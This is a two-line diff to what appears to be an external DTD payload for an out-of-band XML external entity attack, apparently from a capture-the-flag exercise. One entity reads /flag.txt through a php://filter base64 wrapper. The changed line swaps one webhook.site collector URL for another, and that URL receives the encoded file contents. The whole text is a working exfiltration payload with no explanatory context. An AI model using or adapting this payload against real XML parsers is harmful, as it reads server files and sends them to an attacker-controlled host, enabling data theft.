@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'https://webhook.site/8382bed2-e117-4979-9173-6a4e13452bd2/?content=%file;'>">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'https://webhook.site/cbb5a2c5-0549-4117-a664-7a80d47554bf/?content=%file;'>">
